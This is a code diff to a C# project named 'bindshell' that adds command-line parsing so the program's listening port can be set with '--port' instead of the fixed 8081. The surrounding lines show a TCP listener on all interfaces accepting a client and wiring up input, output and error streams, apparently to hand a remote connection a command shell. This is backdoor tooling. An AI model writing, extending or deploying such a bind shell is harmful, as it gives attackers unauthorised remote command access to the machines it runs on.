@@ -9,6 +9,7 @@ using System.Net.Sockets;
 using System.Diagnostics;
 using System.IO;
 using System.Text;
+using System.Text.RegularExpressions;
 namespace bindshell
 {
     public static class SocketService
@@ -17,6 +18,27 @@ namespace bindshell
         private static string GetString(this byte[] byts, int nBytes)
         {
             return Encoding.ASCII.GetString(byts, 0, nBytes);
+        }
+        public static string GetValueOfParameterStr(this string[] parm, string Par_Name)
+        {
+            Match rMatch;
+            foreach (string par in parm)
+            {
+                rMatch = Regex.Match(par, @"^" + Par_Name + @"=?\s*(.+)");
+                if (rMatch.Success) return rMatch.Groups[1].Value;
+            }
+            return "";
+        }
+        public static int ConvertToInt(this string intstr, int fail_return = 0)
+        {            
+            try
+            {
+                return Convert.ToInt32(intstr);
+            }
+            catch (Exception)
+            {
+                return fail_return;
+            }
         }
         public static Task CreateOutputTask(this StreamReader Input, StreamWriter nStream, CancellationToken ctoken)
         {
@@ -71,7 +93,7 @@ namespace bindshell
         /// </summary>
 
         [STAThread]
-        static void Main()
+        static void Main(string[] args)
         {
             Socket Listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             Socket client;
@@ -93,7 +115,7 @@ namespace bindshell
 
             Task tErr, tOut, tIn;
 
-            Listener.Bind(new IPEndPoint(IPAddress.Any, 8081));
+            Listener.Bind(new IPEndPoint(IPAddress.Any, args.GetValueOfParameterStr("--port").ConvertToInt(8081)));
             Listener.Listen(10);
                         
             client = Listener.Accept();
